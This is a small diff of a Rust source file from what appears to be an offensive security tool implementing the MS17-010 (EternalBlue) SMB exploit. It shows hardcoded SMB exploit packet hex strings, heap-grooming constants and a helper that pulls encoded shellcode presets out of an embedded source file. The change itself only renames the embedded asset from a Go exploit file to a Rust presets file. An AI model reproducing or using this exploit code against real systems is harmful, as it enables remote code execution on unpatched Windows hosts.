@@ -121,7 +121,7 @@ const MS17010_SESSION_SETUP_REQUEST_HEX: &str = "00000088ff534d4273000000001807c
 const MS17010_TRANS_NAMED_PIPE_REQUEST_HEX: &str = "0000004aff534d42250000000018012800000000000000000000000088ea30108529810000000000ffffffff0000000000000000000000004a0000004a000200230000000070005c504950455c00";
 const MS17010_TRANS2_SESSION_SETUP_REQUEST_HEX: &str = "0000004eff534d4232000000001807c00000000000000000000000008fffe0000841000f0c0000000010000000000000000a6d9a400000000c00420000004e0001000e000d0000000000000000000000000000";
 const MS17010_AES_KEY: &[u8; 16] = b"0123456789abcdef";
-const MS17010_GO_EXPLOIT_SOURCE: &str = include_str!("../assets/MS17010-Exp.go");
+const MS17010_PRESET_SOURCE: &str = include_str!("../assets/ms17010_presets.rs");
 const MS17010_PACKET_MAX_LEN: usize = 4204;
 const MS17010_PACKET_SETUP_LEN: usize = 497;
 const MS17010_EXPLOIT_INITIAL_GROOMS: usize = 12;
@@ -3815,7 +3815,7 @@ fn resolve_ms17010_shellcode(spec: &str) -> Result<Vec<u8>> {
 
 fn embedded_ms17010_preset(name: &str) -> Option<&'static str> {
     let marker = format!("case \"{name}\":");
-    let (_, remainder) = MS17010_GO_EXPLOIT_SOURCE.split_once(&marker)?;
+    let (_, remainder) = MS17010_PRESET_SOURCE.split_once(&marker)?;
     let (_, remainder) = remainder.split_once("sc_enc := \"")?;
     let (encoded, _) = remainder.split_once('"')?;
     Some(encoded)
